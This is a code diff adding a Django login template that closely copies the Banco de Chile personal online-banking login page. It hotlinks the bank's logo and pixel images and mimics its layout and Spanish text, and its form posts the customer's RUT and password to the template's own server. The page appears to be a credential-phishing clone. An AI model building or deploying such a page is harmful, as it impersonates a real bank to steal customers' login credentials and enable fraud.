@@ -1,0 +1,89 @@
+{% extends 'base-template.html' %}
+{% load static %}
+{% block extra_head_css %}
+    <link href="{% static 'css/base_1.css' %}" rel="stylesheet">
+    <link href="{% static 'css/base_2.css' %}" rel="stylesheet">
+    <link href="{% static 'css/base_3.css' %}" rel="stylesheet">
+    <link href="{% static 'css/base_4.css' %}" rel="stylesheet">
+    <link href="{% static 'css/base_5.css' %}" rel="stylesheet">
+    <link href="{% static 'css/base_6.css' %}" rel="stylesheet">
+{% endblock %}
+{% block body %}
+    <div ui-view="header"  ><img
+            src="https://login.portal.bancochile.cl/bancochile-web/persona/login/assets/images/pixel-medicion.png"
+            alt=""
+            class="pixel-medicion ng-scope" aria-hidden="true">
+        <header class="header-login ng-scope">
+            <div class="container"><h1 class="icon-logo-banco"><img
+                    src="https://login.portal.bancochile.cl/bancochile-web/persona/login/assets/images/logo-bec.png"
+                    alt=""
+                    class="pull-right"></h1></div>
+        </header>
+    </div>
+    <!-- uiView: main -->
+    <div class="ng-scope">
+        <section class="login-bch ng-scope"></section>
+        <div class="container content-login ng-scope">
+            <article class="login-box"><h1 class="text-primary text-center text-light">Bienvenido a nuestro Portal<br>Personas
+                <span class="text-regular">Banco en Línea</span></h1>
+                <form role="form" method="post"
+                      autocomplete="off"
+                      class="ng-pristine ng-invalid ng-invalid-rut ng-invalid-required ng-valid-maxlength">
+                    {% csrf_token %}
+                    <div class="form-group user">
+                        <input
+                                class="form-control ng-pristine ng-invalid ng-invalid-rut ng-invalid-required ng-valid-maxlength ng-touched"
+                                type="text" name="{{ form.rut.name }}" id="{{ form.rut.id_for_label }}"
+                                placeholder="Rut Usuario"
+                                autocomplete="off"
+                                maxlength="12"
+                                autofocus="true" delete-zero-left="">
+                        <i class="ion-person"></i>
+                        {% if form.rut.errors %}
+                            <small class="invalid ng-binding ng-hide"
+                            >{{ form.rut.errors }}</small>
+                        {% endif %}
+                    </div>
+                    <div class="form-group pass">
+                        <input name="{{ form.password.name }}" type="password"
+                               class="form-control ng-pristine ng-untouched ng-invalid ng-invalid-required ng-valid-maxlength"
+                               placeholder="Clave" required="" autocomplete="off" validate="password"
+                               id="{{ form.password.id_for_label }}"> <i
+                            class="ion-ios-locked"></i>
+                        {% if form.password.errors %}
+                            <small
+                                    class="caps-lock-alert invalid"
+                                    id="bch-login-msj-error-chico">
+                                {{ form.password.errors }}
+                            </small>
+                        {% endif %}
+                        {% if form.non_field_errors %}
+                            <small
+                                    class="caps-lock-alert invalid"
+                                    id="bch-login-msj-error-chico">
+                                {{ form.non_field_errors }}
+                            </small>
+                        {% endif %}
+                        <!-- ngIf: vm.showError --><!-- ngIf: vm.errorFolioIncorrecto --></div>
+                    <div class="col-lg-12 col-md-12 col-sm-12">
+                        <div class="row"><!--input type="submit" class="btn success btn-block" value="Ingresar" /-->
+
+                            <button type="submit" class="btn success btn-block" id="idIngresar">Ingresar
+                            </button>
+                        </div>
+                    </div>
+                    <div class="row enlaces-recuperacion"><br><br>
+                        <div class="col-lg-6 col-md-6 col-sm-6 col-xs-6 text-center"><a href="#/olvido-clave-persona"
+                                                                                        ui-sref="olvido-clave-persona"><i
+                                class="ion-chevron-right"></i> Olvido de Clave</a></div>
+                    </div>
+                </form>
+            </article>
+        </div>
+    </div>
+    <!-- uiView: footer -->
+    {% include 'login/login_footer.html' %}
+
+
+
+{% endblock %}
